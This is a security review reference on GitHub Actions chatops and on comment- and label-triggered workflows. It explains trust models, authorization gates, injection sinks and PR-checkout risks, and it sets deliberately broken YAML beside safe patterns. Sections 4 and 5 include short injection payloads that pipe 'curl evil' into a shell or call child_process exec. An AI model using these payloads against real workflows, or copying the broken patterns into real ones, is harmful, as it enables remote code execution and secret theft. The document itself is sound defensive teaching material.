<!--
  Generated initially from spec.yaml; durable after that. Edit this
  reference directly to improve domain depth. Skillet regenerates
  only missing reference files.
-->

# Chatops, comment, label, and discussion handlers

## When to use

Load this reference when the workflow under review triggers on any of:

- `issue_comment` (fires on both issue and PR comments)
- `pull_request_review`, `pull_request_review_comment`
- `discussion`, `discussion_comment`
- `issues` (especially `labeled`, `unlabeled`, `opened`, `edited`)
- `pull_request_target` with `types: [labeled, ...]`
- Any slash-command dispatch (`/test`, `/deploy`, `/rebase`, `/lgtm`, `/release`, etc.)

## Contents

1. The chatops trust model
2. Who can trigger you (the actor surface)
3. Authorization patterns: safe vs. broken
4. Body/label/title interpolation sinks
5. Slash-command parsing pitfalls
6. PR-checkout chatops (the worst case)
7. Label-gated workflows
8. Reporting checklist

---

## 1. The chatops trust model

Comment, review, and discussion events fire with **the repo's secrets and a write-capable `GITHUB_TOKEN` by default**, but the *actor* can be anyone who can comment — which on a public repo means any GitHub user. This inversion (privileged context, public actor) is what makes this trigger class uniquely dangerous.

Key facts to internalize before reviewing:

| Trigger | Default token | Actor surface | Body source |
|---|---|---|---|
| `issue_comment` | write (on default branch) | anyone with comment access | `github.event.comment.body` |
| `pull_request_review` | write | reviewers (public on open repos) | `github.event.review.body` |
| `pull_request_review_comment` | write | reviewers | `github.event.comment.body` |
| `discussion_comment` | write | anyone with discussion access | `github.event.comment.body` |
| `issues` (labeled) | write | anyone who can label (often maintainers, but bots and triagers vary) | `github.event.label.name`, `github.event.issue.title/body` |

`issue_comment` runs the workflow **from the default branch**, not from the PR. That is good for protecting workflow definitions, but it does **not** protect anything the workflow then chooses to check out or execute.

---

## 2. Who can trigger you (the actor surface)

Enumerate the actor surface explicitly before judging exploitability.

- Public repo + `issue_comment` → any GitHub user.
- Public repo + `pull_request_review` → any user who opens a PR can self-review on their own fork? **No** — reviews are on the target PR; the reviewer must have access to comment, which on public repos is any user.
- Private repo → org members and outside collaborators with read.
- `issues: [labeled]` → whoever can apply labels. On many repos this includes triage bots (Renovate, Dependabot, Stale) — treat bot-applied labels as caller-controlled if any human-controlled flow can cause the label.
- `discussion_comment` on a public repo → any GitHub user.

If the workflow is in a public repo and the trigger is comment-based, assume **anonymous internet-level attacker** for severity purposes.

---

## 3. Authorization patterns: safe vs. broken

The job must verify *both* that the actor is permitted **and** that the event applies (e.g., comment is on a PR, not an issue; command matches).

### Broken patterns

```yaml
# BROKEN: no authorization at all
on: issue_comment
jobs:
  run:
    if: contains(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

```yaml
# BROKEN: trusts author_association loosely
if: github.event.comment.user.login == github.event.issue.user.login
# The PR author is the attacker in fork-PR scenarios.
```

```yaml
# BROKEN: trusts CONTRIBUTOR
if: github.event.comment.author_association == 'CONTRIBUTOR'
# CONTRIBUTOR means "has had a PR merged" — not a privilege.
# Anyone with a single merged typo fix qualifies forever.
```

```yaml
# BROKEN: trusts a username allowlist via comment field
if: contains('alice,bob', github.event.comment.user.login)
# OK as a coarse gate, but combined with body interpolation
# below it just narrows, not eliminates, the attack — and
# `contains` against a comma string has substring pitfalls
# (e.g. user "ali" matches "alice,bob").
```

### Acceptable gates

Any one of these alone is *not* sufficient if the body is later interpolated; combine with §4.

```yaml
# Author association allowlist of write-equivalent roles
if: >
  github.event.comment.author_association == 'OWNER' ||
  github.event.comment.author_association == 'MEMBER' ||
  github.event.comment.author_association == 'COLLABORATOR'
```

`author_association` values that imply write-ish trust: `OWNER`, `MEMBER`, `COLLABORATOR`. Values that do **not**: `CONTRIBUTOR`, `FIRST_TIME_CONTRIBUTOR`, `FIRST_TIMER`, `MANNEQUIN`, `NONE`.

```yaml
# Permission check via API in a gating step
- uses: actions/github-script@<sha>
  id: check
  with:
    script: |
      const { data } = await github.rest.repos.getCollaboratorPermissionLevel({
        owner: context.repo.owner,
        repo: context.repo.repo,
        username: context.payload.comment.user.login,
      });
      if (!['admin', 'write'].includes(data.permission)) {
        core.setFailed('insufficient permission');
      }
```

```yaml
# Two-job split: gate runs first with no secrets;
# privileged job uses `needs:` and `if: needs.gate.result == 'success'`
```

### Required additional checks

Beyond actor, gate on event shape:

- For PR chatops on `issue_comment`: check `github.event.issue.pull_request != null`.
- For commands: parse from a normalized string (see §5), not `contains()`.
- For label gates: check `github.event.label.name == 'X'` exactly, not `contains`.

---

## 4. Body/label/title interpolation sinks

Once authz exists, the next exploit is interpolating the body into a shell or script. **Authorization narrows who can attack; it does not make the body safe** — a compromised maintainer account, a token-stolen reviewer, or a self-XSS-style accident is still in scope, and reviewers commonly forget that even maintainer-only chatops should not eval comment bodies.

### Attacker-controlled fields in this trigger class

- `github.event.comment.body`
- `github.event.review.body`
- `github.event.issue.title`, `github.event.issue.body`
- `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.pull_request.head.ref`, `github.event.pull_request.head.label`
- `github.event.discussion.title`, `github.event.discussion.body`
- `github.event.label.name`, `github.event.label.description`
- `github.event.comment.user.login` (rare but: usernames may contain `-`/`[`)
- Any value derived from the above (e.g., a parsed slash-command argument)

### Bad

```yaml
- run: echo "Running for: ${{ github.event.comment.body }}"
- run: ./deploy.sh "${{ github.event.issue.title }}"
- uses: actions/github-script@<sha>
  with:
    script: |
      const arg = "${{ github.event.comment.body }}";  // injection
      core.info(arg);
```

A comment body of `"; curl evil | sh; #` becomes shell. A title of `"); require('child_process').exec('curl evil | sh'); //` becomes JS.

### Safe

```yaml
- name: Echo body
  env:
    BODY: ${{ github.event.comment.body }}
  run: echo "Running for: $BODY"        # quoted, env-passed

- uses: actions/github-script@<sha>
  env:
    BODY: ${{ github.event.comment.body }}
  with:
    script: |
      const body = process.env.BODY;     // read from env
      core.info(body);
```

Same rule for labels, titles, refs, usernames, and discussion fields.

### Workflow-command sinks specific to chatops

Writing a parsed command argument to `$GITHUB_OUTPUT` or `$GITHUB_ENV` lets a newline in the body inject additional outputs/env. Example trap:

```yaml
# BAD — newline in body becomes a new GITHUB_ENV line
- run: |
    arg=$(echo "${{ github.event.comment.body }}" | sed -n 's|^/deploy ||p')
    echo "TARGET=$arg" >> "$GITHUB_ENV"
```

Use a heredoc with a random delimiter or strictly validate against a regex (e.g., `^[A-Za-z0-9._/-]{1,64}$`) before writing.

---

## 5. Slash-command parsing pitfalls

Common mistakes when extracting a command from a body:

| Mistake | Why it bites |
|---|---|
| `if: contains(github.event.comment.body, '/deploy')` | Matches `"don't /deploy this"` and `"/deployments"`. Substring, not token. |
| `startsWith(...)` without trim | A leading newline or space defeats it; an attacker who *wants* it to match will satisfy it; an attacker who wants to bypass other checks can prepend whitespace. |
| Regex without anchors | `/deploy` matches inside `/deployment` and inside quoted text. |
| Splitting on space and trusting `${args[1]}` | Body like `/deploy $(curl evil)` flows straight to shell when the arg is interpolated. |
| Lowercasing for comparison but not for the dispatched value | Inconsistent casing causes case-bypass on allowlists. |

Recommended pattern: do command parsing in a dedicated `actions/github-script` step that reads the body from `process.env`, validates with an anchored regex, and emits **structured outputs** (e.g., `command=deploy`, `target=staging`) where each output has been validated against a closed allowlist before `core.setOutput`.

```yaml
- uses: actions/github-script@<sha>
  id: parse
  env:
    BODY: ${{ github.event.comment.body }}
  with:
    script: |
      const m = /^\/deploy\s+(staging|prod)\s*$/m.exec(process.env.BODY || '');
      if (!m) return core.setOutput('match', 'false');
      core.setOutput('match', 'true');
      core.setOutput('target', m[1]);   // already constrained by regex
```

Subsequent steps then key off `steps.parse.outputs.target`, which is from a closed enum.

---

## 6. PR-checkout chatops (the worst case)

The most dangerous chatops shape:

1. Trigger: `issue_comment` on a PR.
2. Action: maintainer types `/test` (or `/rebase`, `/run-e2e`, `/preview`).
3. Workflow checks out `refs/pull/<n>/head` or `github.event.issue.pull_request.head.sha`.
4. Workflow runs the PR's code (tests, install, build, custom scripts) **with repo secrets and write token**.

This is functionally `pull_request_target` with extra steps. Treat it the same way:

- Any `package.json` script, `Makefile`, `setup.py`, or installed dependency from the PR runs as the privileged context.
- Lockfile mutations enable malicious dependency installation.
- Post-install hooks, `npm prepare`, `pip install -e .` all execute attacker code.

Mitigations to insist on:

- Split into two jobs: a no-secrets job that does the build/test, a separate small job that posts results. Don't grant secrets or write token to the job that runs PR code.
- Or run the PR code on an ephemeral, network-restricted runner with no token mount.
- If a write token is required to comment results back, scope `permissions:` to `pull-requests: write` and nothing else, and isolate the commenting step from the PR-code step (different job).

Do **not** accept "the maintainer typed `/test` so it's fine" — the maintainer authorized running the PR code, not handing it secrets.

---

## 7. Label-gated workflows

Workflows triggered by `issues: [labeled]` or `pull_request_target: [labeled]` are commonly used as a "human approved" gate for running PR code with secrets. Failure modes:

- **Label sticks across pushes.** If the label was applied at SHA `A` and the workflow checks out `pull_request.head.sha` at trigger time, the attacker can push `B` after labeling. Require the workflow to either re-verify the labeled SHA or remove the label on every push (`pull_request_target: [synchronize]` → unlabel).
- **Label name interpolation.** `github.event.label.name` is attacker-influenced if any user can create labels (some repos let triagers create labels with arbitrary names). Don't interpolate label names into shells.
- **`if:` checks that miss the type.** A workflow that runs on `[opened, labeled, synchronize]` and only checks `if: contains(github.event.pull_request.labels.*.name, 'safe')` will run on `opened`/`synchronize` whenever the label happens to be present — including after the label was applied previously, defeating any "review the diff before labeling" assumption.

Safe shape:

```yaml
on:
  pull_request_target:
    types: [labeled]
jobs:
  run:
    if: github.event.label.name == 'ok-to-test'
    # plus: separate job, drop label on synchronize, etc.
```

---

## 8. Reporting checklist

For each chatops finding, the report must state:

- [ ] Trigger and event types (`issue_comment` / `pull_request_review` / etc.).
- [ ] Public-vs-private repo assumption and resulting actor surface.
- [ ] Authorization gate present? If yes, what is it (allowlist, `author_association`, API permission check, none)?
- [ ] Whether the gate is bypassable (substring `contains`, `CONTRIBUTOR` trust, missing PR-vs-issue check, label-stickiness).
- [ ] The attacker-controlled field (body, title, ref, label name, parsed argument).
- [ ] The sink (`run:` shell, `script:` body, `$GITHUB_ENV` write, checked-out PR code execution).
- [ ] Privilege reached (write `GITHUB_TOKEN`, specific
